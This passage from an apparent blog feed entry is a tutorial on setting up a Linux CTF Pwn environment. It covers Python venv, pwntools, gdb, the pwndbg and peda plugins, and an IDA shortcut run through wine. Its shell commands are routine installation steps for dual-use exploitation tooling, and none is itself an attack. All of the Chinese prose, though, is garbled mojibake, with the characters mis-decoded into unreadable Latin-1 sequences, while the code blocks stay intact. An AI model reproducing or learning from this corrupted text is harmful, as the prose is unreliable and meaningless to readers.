href="https://hex-rays.com/ida-free/">IDA Free</a>ï¼Œç›®å‰ä»…æ”¯æŒ x86 é€†å‘ï¼Œä¸è¿‡å¯¹äºç»å¤§éƒ¨åˆ† CTF ä¸­ Linux ä¸‹çš„ç”¨æˆ·æ€ Pwn é¢˜ç›®è€Œè¨€é€šå¸¸å·²è¶³å¤Ÿä½¿ç”¨ã€‚</p><h2 id="å®‰è£…-Python"><a href="#å®‰è£…-Python" class="headerlink" title="å®‰è£… Python"></a>å®‰è£… Python</h2><p>ç»å¤§éƒ¨åˆ† Linux å‘è¡Œç‰ˆç›®å‰å·²ç»è‡ªå¸¦ Python è¿è¡Œç¯å¢ƒï¼Œå› æ­¤é€šå¸¸æˆ‘ä»¬å¹¶ä¸éœ€è¦æ‰‹åŠ¨å®‰è£… Pythonã€‚ã€‚è‹¥ä½ çš„è®¡ç®—æœºä¸Šä¸å­˜åœ¨ Python è¿è¡Œç¯å¢ƒï¼Œåˆ™å¯ä»¥æ ¹æ®è‡ªå·±æ‰€ä½¿ç”¨çš„å‘è¡Œç‰ˆæ‰‹åŠ¨ä½¿ç”¨åŒ…ç®¡ç†å™¨è¿›è¡Œå®‰è£…ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œéƒ¨åˆ† Linux å‘è¡Œç‰ˆä¸­ Python ç‰ˆæœ¬é»˜è®¤ä¸º Python2ï¼Œå› æ­¤ä½ å¯èƒ½éœ€è¦æ‰‹åŠ¨æŒ‡å®šå®‰è£… Python3ã€‚</p><h2 id="é…ç½®-venv-python-ç¯å¢ƒï¼ˆå¯é€‰ï¼‰"><a href="#é…ç½®-venv-python-ç¯å¢ƒï¼ˆå¯é€‰ï¼‰" class="headerlink" title="é…ç½® venv python ç¯å¢ƒï¼ˆå¯é€‰ï¼‰"></a>é…ç½® venv python ç¯å¢ƒï¼ˆå¯é€‰ï¼‰</h2><p>åœ¨éƒ¨åˆ† Linux å‘è¡Œç‰ˆä¸Šï¼ˆå¦‚ <code>openSUSE Tumbleweed</code> ï¼‰ä½¿ç”¨ <code>pip</code> å‘½ä»¤æ—¶ï¼Œä½ å¯èƒ½ä¼šé‡åˆ°å¦‚ä¸‹æŠ¥é”™ï¼Œè¿™æ˜¯ç”±äºå‘è¡Œç‰ˆè‡ªèº«å®‰å…¨ç­–ç•¥é™åˆ¶çš„ç¼˜æ•…ï¼š</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">error: externally-managed-environment<br><br>Ã— This environment is externally managed<br>â•°â”€&gt; To install Python packages <span class="hljs-keyword">system</span>-wide, <span class="hljs-keyword">try</span><br>    zypper install python311-xyz, where xyz is <span class="hljs-keyword">the</span> package<br>    you are trying <span class="hljs-built_in">to</span> install.<br>    <br>    If you wish <span class="hljs-built_in">to</span> install <span class="hljs-keyword">a</span> non-rpm packaged Python package,<br>    <span class="hljs-built_in">create</span> <span class="hljs-keyword">a</span> virtual environment <span class="hljs-keyword">using</span> python3<span class="hljs-number">.11</span> -m venv path/<span class="hljs-built_in">to</span>/venv.<br>    Then use path/<span class="hljs-built_in">to</span>/venv/bin/python <span class="hljs-keyword">and</span> path/<span class="hljs-built_in">to</span>/venv/bin/pip.<br>    <br>    If you wish <span class="hljs-built_in">to</span> install <span class="hljs-keyword">a</span> non-rpm packaged Python application,<br>    <span class="hljs-keyword">it</span> may be easiest <span class="hljs-built_in">to</span> use `pipx install xyz`, which will manage <span class="hljs-keyword">a</span><br>    virtual environment <span class="hljs-keyword">for</span> you. Install pipx via `zypper install python311-pipx` .<br><br>note: If you believe this is <span class="hljs-keyword">a</span> mistake, please contact your Python installation <span class="hljs-keyword">or</span> OS distribution provider. You can override this, <span class="hljs-keyword">at</span> <span class="hljs-keyword">the</span> risk <span class="hljs-keyword">of</span> breaking your Python installation <span class="hljs-keyword">or</span> OS, <span class="hljs-keyword">by</span> passing <span class="hljs-comment">--break-system-packages.</span><br></code></pre></td></tr></table></figure><p>å¯¹äºè¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©ä½¿ç”¨ <a href="https://docs.python.org/zh-cn/3/library/venv.html#module-venv">venv</a> æ¨¡å—åˆ›å»ºâ€œè™šæ‹Ÿç¯å¢ƒâ€ã€‚è™šæ‹Ÿç¯å¢ƒåœ¨é»˜è®¤æƒ…å†µä¸‹ä¸å…¶ä»–è™šæ‹Ÿç¯å¢ƒä¸­çš„è½¯ä»¶ä»¥åŠæ“ä½œç³»ç»Ÿä¸­å®‰è£…çš„ Python è§£é‡Šå™¨å’Œåº“ä¿æŒéš”ç¦»ï¼Œè¿™ç¡®ä¿äº†è½¯ä»¶åŒ…å®‰è£…çš„å®‰å…¨æ€§ï¼Œä¸”ä½¿å¾—æˆ‘ä»¬èƒ½å¤Ÿç®€å•åœ°åˆ é™¤å¹¶ä»å¤´å¼€å§‹é‡å»ºç¯å¢ƒã€‚</p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤åˆ›å»ºä¸€ä¸ªæ–°çš„è™šæ‹Ÿç¯å¢ƒï¼ˆè‹¥è·¯å¾„ä¸å­˜åœ¨ï¼Œåˆ™å°†è¢«åˆ›å»ºï¼‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 -m venv è‡ªå®šä¹‰çš„venvæ–‡ä»¶å¤¹è·¯å¾„<br></code></pre></td></tr></table></figure><p>å®Œæˆåˆ›å»ºä¹‹åï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥é€šè¿‡ <code>source</code> å‘½ä»¤è¿›å…¥åˆ° venv ä¸­ï¼Œè¯·æ ¹æ®ä½ æ‰€ä½¿ç”¨çš„ shell è¿›è¡Œé€‰æ‹©å…¶ä¸­ä¹‹ä¸€ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">source è‡ªå®šä¹‰çš„venvæ–‡ä»¶å¤¹è·¯å¾„/bin/activate         # for bash<br>source è‡ªå®šä¹‰çš„venvæ–‡ä»¶å¤¹è·¯å¾„/bin/activate.fish     # for fish<br>source è‡ªå®šä¹‰çš„venvæ–‡ä»¶å¤¹è·¯å¾„/bin/activate.csh     # for csh/tcsh<br></code></pre></td></tr></table></figure><blockquote><p>ä½ ä¹Ÿå¯ä»¥é€‰æ‹©å°†è¿™æ¡å‘½ä»¤åŠ å…¥åˆ° <code>~/.bashrc</code> æ–‡ä»¶ä¸­ï¼Œä»è€Œåœ¨æ‰“å¼€ shell æ—¶é»˜è®¤æ‰§è¡Œã€‚</p></blockquote><p>ç”±äºè™šæ‹Ÿç¯å¢ƒå…·æœ‰è½»é‡ã€å®‰å…¨ã€å¯é‡æ„å»ºçš„ç‰¹æ€§ï¼Œå› æ­¤å³ä¾¿æ˜¯åœ¨ä½ çš„è®¡ç®—æœºä¸Šå¹¶ä¸å­˜åœ¨å®‰å…¨ç­–ç•¥é™åˆ¶ï¼Œæˆ‘ä»¬ä¹Ÿæ›´æ¨èä½ ä¸º CTF&#x2F;Pwn åˆ›å»ºä¸€ä¸ªå•ç‹¬çš„ Python è™šæ‹Ÿç¯å¢ƒã€‚</p><h2 id="å®‰è£…-pwntools"><a href="#å®‰è£…-pwntools" class="headerlink" title="å®‰è£… pwntools"></a>å®‰è£… pwntools</h2><p><a href="https://docs.pwntools.com/en/stable/">pwntools</a> æ˜¯ä¸€ä¸ªå¼ºå¤§çš„ Python è½¯ä»¶åŒ…ï¼Œå…¶ä¸ºæˆ‘ä»¬æä¾›äº†åŸºæœ¬çš„ pwn è„šæœ¬ç¼–å†™ç¯å¢ƒï¼Œä»¥åŠå„ç±»æ–¹ä¾¿çš„åˆ©ç”¨å·¥å…·ï¼Œåœ¨å®‰è£…å¥½ Python ä»¥åŠ pip ä¹‹åä½ å¯ä»¥å¾ˆæ–¹ä¾¿åœ°ä½¿ç”¨å¦‚ä¸‹æŒ‡ä»¤è¿›è¡Œå®‰è£…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">python3 -m pip install --upgrade pip<br>python3 -m pip install --upgrade pwntools<br></code></pre></td></tr></table></figure><p>ä¹‹ååœ¨ Python ä¸­ä¾¿èƒ½å¾ˆæ–¹ä¾¿åœ°é€šè¿‡ <code>from pwn import *</code> æŒ‡ä»¤ä½¿ç”¨è¯¥åŒ…ä¸­çš„å„ç±»å·¥å…·ï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ <code>from pwn import åå­—</code> æ¥ä»…å¯¼å…¥æ‰€éœ€çš„ç‰¹å®šå·¥å…·ï¼Œæˆ–æ˜¯ä½¿ç”¨ <code>import pwn</code> å¯¼å…¥åŒ…ååé€šè¿‡ <code>pwn.åå­—</code> æ¥ä½¿ç”¨å¯¹åº”çš„å·¥å…·ã€‚</p><h2 id="å®‰è£…-gdb"><a href="#å®‰è£…-gdb" class="headerlink" title="å®‰è£… gdb"></a>å®‰è£… gdb</h2><p>GNU Debuggerï¼ˆGDBï¼‰æ˜¯ GNU é¡¹ç›®å¼€å‘çš„è½¯ä»¶è°ƒè¯•å™¨ï¼Œä½¿ç”¨ gdb æˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿åœ°å¯¹äºŒè¿›åˆ¶ç¨‹åºè¿›è¡ŒåŠ¨æ€è°ƒè¯•ã€‚</p><p>gdb åœ¨ç»å¤§éƒ¨åˆ† Linux å‘è¡Œç‰ˆä¸Šéƒ½å·²é»˜è®¤å®‰è£…ï¼Œä½ å¯ä»¥åœ¨ shell ä¸­è¾“å…¥ <code>gdb</code> å‘½ä»¤è¿›è¡Œç¡®è®¤ï¼ˆè¾“å…¥ <code>q</code> é€€å‡ºï¼‰:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gdb</span><br>GNU gdb (GDB; SUSE Linux Enterprise 15) 13.2<br>Copyright (C) 2023 Free Software Foundation, Inc.<br>License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;<br>This is free software: you are free to change and redistribute it.<br>There is NO WARRANTY, to the extent permitted by law.<br>Type &quot;show copying&quot; and &quot;show warranty&quot; for details.<br>This GDB was configured as &quot;x86_64-suse-linux&quot;.<br>Type &quot;show configuration&quot; for configuration details.<br>For bug reporting instructions, please see:<br>&lt;http://bugs.opensuse.org/&gt;.<br>Find the GDB manual and other documentation resources online at:<br>    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.<br><br>For help, type &quot;help&quot;.<br>Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.<br>(gdb) <br></code></pre></td></tr></table></figure><p>è‹¥ä½ çš„è®¡ç®—æœºå°šæœªå®‰è£… gdbï¼Œåˆ™å¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œå®‰è£…ï¼Œè¯·è‡ªè¡Œåˆ†è¾¨ä½ æ‰€ä½¿ç”¨çš„å‘è¡Œç‰ˆã€‚</p><p>Debian &#x2F; Ubuntu:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install -y gdb<br></code></pre></td></tr></table></figure><p>openSUSE Leap &#x2F; Tumbleweed &#x2F; SLE:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo zypper install gdb<br></code></pre></td></tr></table></figure><p>Arch Linux &#x2F; Manjaro &#x2F; EndeavourOS:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo yay -S gdb # è‹¥æœªé…ç½® AURï¼Œä½ ä¹Ÿå¯ä»¥ä½¿ç”¨ pacman -S gdb è¿›è¡Œå®‰è£…<br></code></pre></td></tr></table></figure><p>Fedora &#x2F; CentOS &#x2F; RHEL:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo yum install gdb # äº‹å®ä¸Šï¼Œyum è¢«è½¯é“¾æ¥åˆ° dnf<br></code></pre></td></tr></table></figure><h2 id="å®‰è£…-pwndbg"><a href="#å®‰è£…-pwndbg" class="headerlink" title="å®‰è£… pwndbg"></a>å®‰è£… pwndbg</h2><p><a href="https://github.com/pwndbg/pwndbg">pwndbg</a> (&#x2F;paÊŠnËˆdiËŒbÊŒÉ¡&#x2F;) æ˜¯ä¸€ä¸ªå¼ºå¤§çš„ GDB æ’ä»¶ï¼Œé€šè¿‡è¯¥æ’ä»¶æˆ‘ä»¬å¯ä»¥åœ¨è°ƒè¯•æ—¶å¾ˆæ–¹ä¾¿åœ°æŸ¥çœ‹è¿è¡Œç¯å¢ƒä»¥åŠè·å–å †å†…å­˜å¸ƒå±€ç­‰ä¿¡æ¯ã€‚</p><p>pwndbg é¡¹ç›®è‡ªå¸¦äº†å®‰è£…è„šæœ¬ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿åœ°ä»æºç è¿›è¡Œå®‰è£…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/pwndbg/pwndbg<br>cd pwndbg<br>./setup.sh<br></code></pre></td></tr></table></figure><p>å¯¹äºä½¿ç”¨ nix åŒ…ç®¡ç†å™¨çš„å‘è¡Œç‰ˆï¼ˆå¦‚ NixOSï¼‰ï¼Œä½ å¯ä»¥é€šè¿‡å¦‚ä¸‹å‘½ä»¤è¿›è¡Œå®‰è£…ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">nix shell github:pwndbg/pwndbg<br>pwndbg ./your-binary<br></code></pre></td></tr></table></figure><h2 id="å®‰è£…-peda"><a href="#å®‰è£…-peda" class="headerlink" title="å®‰è£… peda"></a>å®‰è£… peda</h2><blockquote><p>æ³¨ï¼špeda å’Œ pwndbg ä½ åªéœ€è¦å®‰è£…å…¶ä¸­ä¹‹ä¸€ï¼Œç”±äºåŠŸèƒ½é‡å¤ï¼Œä¸”ä¸ºäº†é¿å…æ’ä»¶å†²çªï¼Œæˆ‘ä»¬å¹¶ä¸æ¨èä½ åŒæ—¶å®‰è£…è¿™ä¸¤ä¸ªæ’ä»¶ã€‚</p></blockquote><p><a href="https://github.com/longld/peda">peda</a> æ˜¯ä¸€ä¸ªå¼ºå¤§çš„ GDB æ’ä»¶ï¼Œé€šè¿‡è¯¥æ’ä»¶æˆ‘ä»¬å¯ä»¥åœ¨è°ƒè¯•æ—¶å¾ˆæ–¹ä¾¿åœ°æŸ¥çœ‹è¿è¡Œç¯å¢ƒä»¥åŠè·å–å †å†…å­˜å¸ƒå±€ç­‰ä¿¡æ¯ã€‚</p><p>peda æ’ä»¶æ— éœ€è¿‡å¤šé…ç½®ï¼Œæˆ‘ä»¬åªéœ€è¦å°†æºç ä¸‹è½½åˆ°æœ¬åœ°åæ›´æ–° gdb é…ç½®å³å¯ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/longld/peda.git ~/peda<br>echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit<br>echo &quot;DONE! debug your program with gdb and enjoy&quot;<br></code></pre></td></tr></table></figure><h1 id="0x03-æ‚é¡¹é…ç½®"><a href="#0x03-æ‚é¡¹é…ç½®" class="headerlink" title="0x03. æ‚é¡¹é…ç½®"></a>0x03. æ‚é¡¹é…ç½®</h1><h2 id="ä¸º-Linux-ä¸‹è¿è¡Œ-IDA-é…ç½®-desktop-shortcut"><a href="#ä¸º-Linux-ä¸‹è¿è¡Œ-IDA-é…ç½®-desktop-shortcut" class="headerlink" title="ä¸º Linux ä¸‹è¿è¡Œ IDA é…ç½® desktop shortcut"></a>ä¸º Linux ä¸‹è¿è¡Œ IDA é…ç½® desktop shortcut</h2><p>wine å¯¹äº Windows å„ç§ API çš„é‡å†™å·²ç»éå¸¸æˆç†Ÿäº†ï¼Œè¿™ä½¿å¾— IDA Pro çš„ Windows ç‰ˆæœ¬ï¼ˆæˆ–è®¸ä¹Ÿæ˜¯ç»å¤§å¤šæ•°äººä¼šä½¿ç”¨çš„ç‰ˆæœ¬ï¼‰èƒ½å¤Ÿæ¯”è¾ƒè½»æ¾åœ°åœ¨ Linux ä¸‹è¿è¡Œï¼Œå¯¹äºå®Œå…¨å·¥ä½œåœ¨ Linux ä¸‹çš„åŒå­¦è¿™æ˜¯ä¸€ä»¶å¥½äº‹ï¼Œå› ä¸ºè¿™æ„å‘³ç€ä¸éœ€è¦ä½¿ç”¨è™šæ‹Ÿæœºæ¥å•ç‹¬è¿è¡Œ IDA Pro</p><p>å¯¹äºæƒ³è¦ä¸º IDA åˆ›å»ºå¿«æ·æ–¹å¼çš„ Linux Desktop ç”¨æˆ·ï¼Œä½ å¯ä»¥å‚è€ƒå¦‚ä¸‹æ¨¡æ¿ç¼–å†™ <code>.desktop</code> æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/usr/bin/env xdg-open</span><br>[Desktop Entry]<br>Name=IDA Pro 7.5<br>Comment=A powerful disassembler and a versatile debugger<br>GenericName=Disassembler<br>Exec=wine /home/arttnba3/Applications/IDA7.5/ida64.exe<br>Icon=/home/arttnba3/Applications/pic/ida64.png<br>Type=Application<br>Categories=Development;<br>Keywords=IDA;<br></code></pre></td></tr></table></figure><p>å®Œæˆç¼–å†™åå°†è¯¥æ–‡ä»¶æ”¾åˆ° <code>~/.local/share/applications/</code> ç›®å½•ä¸‹å³å¯ï¼š</p><p><img src="https://s2.loli.net/2024/05/15/7UVMnDA6q1eJblK.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä¿¡ Docker ï¼Œå¾—æ°¸ç”Ÿ&lt;/p&gt;</summary>
    
    
    
    <category term="PWN" scheme="https://arttnba3.github.io/categories/PWN/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
  </entry>
  
</feed>
